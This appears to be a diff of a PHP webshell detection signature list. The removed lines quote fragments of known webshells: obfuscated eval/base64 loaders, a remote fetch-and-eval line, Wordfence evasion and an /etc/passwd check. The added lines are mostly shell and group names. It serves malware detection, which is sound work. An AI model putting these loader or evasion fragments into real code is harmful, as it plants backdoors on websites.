@@ -1,124 +1,49 @@
-solevisible@gmail.com
-header("X-XSS-Protection: 0");ob_start();set_time_limit(0);error_reporting(0);ini_set('display_errors', FALSE);
-By: MR.P4UL / Bo0G3yM4n
-// Download : https://github.com/eviltwin-id/eviltwin-shell
-error_reporting(0);ini_set("display_errors", 0);if(!defined('rnavkdih')){define('rnavkdih'
-//--------------Watching webshell!--------------
 eval(htmlspecialchars_decode(base64_decode(urldecode(base64_decode($t13r)))));
-* Konsep Shell : Brillyan -Founder { IndoSec }-
-{ IndoSec sHell }
-&lt; root@indoxploit:~# w00t??? &gt;
-## recoded b374k shell
-https://github.com/b374k/b374k
-* webadmin.php - a simple Web-based file manager
-c99shell.php v.2.0 (PHP 7) (25.02.2019) Updated by: HackingTool for PHP 7
 eval(htmlspecialchars_decode(urldecode(base64_decode($xD)))); exit; ?&gt;
-eval(base64_decode(base64_decode('
-// Coded By Mr.Lutfie404 Remix By ./LuLlaby007
-// Cylul007 Webshell Is Webshell For Bypass Firewall When It's Deleted,403 Forbidden,406 Not Acceptable,Downloaded,ETC.
-* H3K | Tiny File Manager V2.4.6
-&lt;br/&gt;&lt;h3&gt;22Xploiter Shell Backdoor&lt;/h3&gt;&lt;hr/&gt;&lt;br/&gt;
-Special thanks for Holiq@Indosec
-;eval(base64_decode("
-This code was created on Friday, May 11th, 2018 at 15:37 UTC from IP 45.77.117.183
-Beyaz_Hacker.php completely rewritten:
-&nbsp;Programer : SimAttacker - Edited By KingDefacer&lt;br&gt;
+eval(base64_decode(
 eval(strrev(htmlspecialchars_decode(gzinflate(base64_decode($obfuscator)))))
-GitHub: https://github.com/Saskraxploit
-&lt;title&gt;'.$_SERVER['HTTP_HOST'].' ~ Saudi Sh3ll&lt;/title&gt;
-echo "&lt;link href=data:image/gif;https://i.ibb.co/7pksvzC/20200701-002727.png rel=icon type=image/x-icon /&gt;";
-&lt;!-- RandsX aka T1kus_g0t --&gt;
-// Priv Shell
-// Silence Because Yourself
-/** Adminer - Compact database management
-echo "&lt;script&gt;alert('Your shell script was succefully deleted!')&lt;/script&gt;";
-//TEAM: ANON GHOST TEAM - GHOST SQUAD HACKERS - BLACK CODERS ANONYMOUS SATANIC EXPLOITER 2K07 - SILENT GHOST TEAM - MAURITANIA HACKERS TEAM - MARIANAS WEB TEAM 2K05
-${"\x47\x4c\x4f\x42ALS"}["i\x6b\x6epl\x64\x72\x70\x69\x67\x6f"]
-preg_match($fge_ebg13($onfr64_qrpbqr('L1xbQ1VDeGJlaF9QYnFyXF0oLio/KVxbXC9DVUN4YmVoX1BicXJcXS9m')), file_get_contents(__FILE__), $CUCxbeh_z);
-$UeXploiT = "Sy1LzNFQKyzNL7G2V0svsYYw9YpLiuKL8ksMjTXSqzLz0nISS1K\x42rNK85Pz\x63gqLU4mLq\x43\x43\x63lFqe\x61m\x63Snp\x43\x62np6Rq\x41O0sSi3TUHHMM8iLN64IyMnPDEkN0kQ\x431g\x41\x3d";
-&lt;!-- Anon7 - AnonsecTeam --&gt;
-$uD64_c0m="\163\164\x72\x5f\162\x6f\164"."13";$uD64_Com="\147\x7a\151\x6e\x66\x6c\141\164\x65";
-&lt;p&gt;407Mini_&lt;font color="white"&gt;Shell&lt;/p&gt;&lt;/font&gt;
-&lt;title&gt;Anonim Us&lt;/title&gt;
-$s_title = "b374k ".$s_ver; // shell title
-$s_color = "ff0000"; // shell theme color, default : 4c83af
-$OOO000000=urldecode('%66%67%36%73%62%65%68%70%72%61%34%63%6f%5f%74%6e%64');
-# https://www.facebook.com/Hun73r.Ariyan  #
-$enc = '==QNi+tW2qjQkvB/t0zHP++lAG0xRPo8MiuL/LpV6R3H/M01Hc3AYMd4wrXQeiTNMh7pYzWxibkdqNOBmr/
-$ZlwBhrDSDRgGg='fun'.'ct'.'i'.'o'.'n_exi'
-Obfuscation provided by FOPO - Free Online PHP Obfuscator: http://www.fopo.com.ar/
-# Update   : http://pastebin.com/u/shutdown57
-eval("?\x3e".file_get_contents("http\x73://ano\x6e\x737\x39.\x63o\x6d/m\x69\x6ei\x73\x68\x65\x6cl.\x70h\x70"));?&gt;
-//Obfuscation provided by FOPO - Free Online PHP Obfuscator v1.2: http://www.fopo.com.ar
-$version='version 1.5 by Grinay';
-&lt;link href="https://privdayz.com/wp-content/themes/privdaysv1/hacker.css" rel="stylesheet"&gt;
-Andela Web Shell
-[]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; c0d3d by lionaneesh &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;
-$password='b374k';
-/* PHP Encode by  https://Www.PHPJiaMi.Com/ */error_reporting(0);
 .gzuncompress(base64_decode(
-Obfuscation provided by Unknowndevice64 - Free Online PHP Obfuscator
-Berandal Shell V1.1 © 2017
-$JhonCoders = "ZXZhbCUyOCUyNnF1b3QlM0IlM0YlMjZndCUzQiUyNnF1b3QlM0IuZ3p1bmNvbXByZXNzJTI4Z3p1bmNvbXByZXNzJTI4Z3ppbmZsYXRlJTI4Z3ppbmZsYXRlJTI4Z3ppbmZsYXRlJTI4YmFzZTY0X2RlY29kZSUyOHN0cnJldiUyOCUyNEJsYWNrX0NvZGVycyUyOSUyOSUyOSUyOSUyOSUyOSUyOSUyOSUzQg==";
-$stt1 = "Sy1LzNFQsrdT0isuKYovyi8xNNZIr8rMS8tJLEkFskrzkvNz\x434pSi4upI5yUWJxqZhKfkpq\x63n5Kq\x41\x62SzKLVMQ6W4pMR\x41EwlY\x41w\x41\x3d";
-$stt0 = "\x3d\x3dwP1ed\x42s4qp\x42i1pYtmkfGsw\x418//
-| b3c4k-Lompat V 2.0 - Khusus Untuk Jumping (LOMPAT KODOK)
-$auth_pass = "c347fc867b4a339639fbac8c96410afd";
-* Responsive Webshell
-$OOO000000=urldecode('%66%67%36%73%62%65%68%70%72%61%34%63%6f%5f%74%6e%64');$OOO0000O0=$OOO000000{4}
-&lt;title&gt;xB1N4RYx&lt;/title&gt;
-$jasmine = "Uv1bk6u89uYL3
-/// About : Tools Shell Diambil Dari Contek Shell & Indoxploit Shell ///
-&lt;title&gt;Black Ser0ja&lt;/title&gt;
-eval(base64_decode(base64_decode(
 eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
-echo '&lt;table width="95%" border="0" cellpadding="0" cellspacing="0" align="center"&gt;
-goto jftpU; XlRbQ: foreach (array_merge($dirs, $files) as $path) { $d = is_dir($path); $w = is_writable($path); ?&gt;
-/* You can change the login pass, but it should be in md5. You can encrypt your password here http://md5encryption.com/ */
-$code = "7T35W+u2sr+/73v/g+vLLaGErGwhkJ4QEghbIAkJcE4/rmM7sYk3bGc9r//702ix5cRhOT1t770
-"PD9waHAKLyoKQmxhY2tzY29ycGlvbiBPYmZ1c2NhdG9yCkZyb20gOiBodHRwOi8vMTI3LjA
-"PD9waHAKLyoKCQlUaGUgR2l2ZW4gQ29kZSBXYXMgU3VjY2Vzc2Z1bGx5IE9iZnVz
-#Title :Con7ext Shell V.2                            #
-#Title : Con7ext Mini Shell ( Con7ext Web Shell v.2 )#
-#      Con7ext Shell by Hun73r CL4W       #
-"Sy1LzNFQsrdT0isuKYovyi8xNNZIr8rMS8tJLEkFskrzkvNz\x434pSi4upI5yUWJxqZhKfkpq\x63n5Kq\x41\
-${"GL\x4fB\x41\x4c\x53"}["j\x69\x6d\x63\x6eu\x66\x65"]
-"Sy1LzNFQt7dT10uvKs1Lzs8tKEotLtZIr8rMS8tJLEnVSEosTjUziU9JT\x
-"Sy1LzNFQsrdT0isuKYovyi8xNNZIr8rMS8tJLEkFskrzkvNz\x434pSi4upI5yUWJxqZhKfkpq\x63n5Kq\x41\x62SzKLVMQ6W4pMR\x41EwlY\x41w\x41\x3d";
-$etc_passwd = @is_readable("/etc/passwd") ? "&lt;b&gt;&lt;span style=\"color:white\"&gt;ON &lt;/span&gt;&lt;/b&gt;"
-RyukZ Shell v2  :)
-$script_deface = "Hacked By nginxDEX"; //Script Deface. (html, php, txt)
-/* CaZaNoVa163 */ $eval=("?&gt;".gzuncompress(base64_decode("eJwkm9eO
-/* october73 shell & CrystalShell &lt; coding by super crystal
-# Greetz:UxAir,ZeSn,Jr.Haxor,Baddass   #
-* https://github.com/xchwarze/CCCPShell
-&lt;title&gt;#I LOVE YOU EVERDAY#&lt;/title&gt;
-&lt;title&gt;CR4ZY 3RR0R M!N! 5H311&lt;/title&gt;
-die("&lt;h1&gt;404 Not Found&lt;/h1&gt;The page that you have requested could not be found.");
-&lt;link rel="icon" type="image/png" href="https://data.whicdn.com/images/317122168/original.jpg"&gt;
-/* Protected By Mrcakil */$OOO000000=urldecode('%66%67%36%73%62%65%68%70%72%61%34%63%6f%5f%74%6e%64');
-&lt;p class="cyber-speaks"&gt;  Darkness Webshell &lt;/p&gt;
-//=====+++An Indian Hacker+++=====//
-/*Emperor Hacking TEAM */
-if(empty($cmd)) $cmd = @$_GET['cmd'];
-&lt;script src="http://www.rootkitninja.com/say.js"&gt;&lt;/script&gt;
-$GLOB['PHP']['upload_max_filesize']=((integer)str_replace(array('K', 'M'), array('000', '000000'), ini_get('upload_max_filesize')));
-error_reporting(0);
-&lt;meta name="author" content="./EcchiExploit"&gt;
-* Summary of EcchiShell
+solevisible@gmail.com
+https://github.com/eviltwin-id/eviltwin-shell
+Watching webshell!
+IndoSec sHell
+https://github.com/b374k/b374k
+c99shell.php
+Cylul007 Webshell Is Webshell
+Tiny File Manager V2.4.6
+22Xploiter Shell Backdoor
+Special thanks for Holiq@Indosec
+Beyaz_Hacker.php
+SimAttacker - Edited By KingDefacer
+https://github.com/Saskraxploit
+Saudi Sh3ll&lt
+RandsX aka T1kus_g0t
+Priv Shell
+Your shell script was succefully deleted!
+ANON GHOST TEAM - GHOST SQUAD HACKERS
+Anon7 - AnonsecTeam
+https://www.facebook.com/Hun73r.Ariyan
+http://pastebin.com/u/shutdown57
+http://www.fopo.com.ar/
+https://privdayz.com/wp-content/themes/privdaysv1/hacker.css
+Andela Web Shell
+https://Www.PHPJiaMi.Com/
+Berandal Shell
+Free Online PHP Obfuscator
+Responsive Webshell
+Tools Shell Diambil Dari Contek Shell & Indoxploit Shell
+Hacked By nginxDEX
+https://github.com/xchwarze/CCCPShell
+CR4ZY 3RR0R M!N! 5H311
+Protected By Mrcakil
+An Indian Hacker
+Emperor Hacking TEAM
+if(empty($cmd))
+http://www.rootkitninja.com/
 http://target.com/ecchi.php?a=system&ecchi[]=ls
-&lt;title&gt;./EcchiExploit&lt;/title&gt;
-&lt;meta name="keywords" content="&lt;?= author ?&gt;"&gt;
-# Recode IndoXploit And All Shell Backdoor #
-# Blackhat Shell By cr1p.blogspot.com
-die("&lt;html&gt;&lt;title&gt;404 Not Found&lt;/title&gt;
-Copyright 2017 WhiteWinterWolf
-eX-Kita Webshell (Exploit-Kita Webshell)
-echo '&lt;center&gt;unlink failed!&lt;/center&gt;';
-if (is_file($_SERVER['DOCUMENT_ROOT'].'/wp-content/plugins/wordfence/wordfence.php')) {rename($_SERVER
-&lt;img src="https://i.ibb.co/PWpDLJz/Black-Hair-Anime-Girl-Transparent-Background.png" width="200" height="200"&gt;
-$stt0 = "
-Web Console v0.9.7 (2016-11-05)
-var $x64 = "yRg0SuIuhIs+Yy1PtAL/h19ksnEIL0qiV4wlDw8
-$gzinflate = "=o3hLQL2WX6SA8P//gq6Jt8/6X8/6X8/6X8
-error_reporting(0); if($_GET['dian'] == 'hanna'){$saw1 = $_FILES['file']['tmp
+Summary of EcchiShell
+./EcchiExploit
+IndoXploit
+Blackhat Shell
+Exploit-Kita Webshell
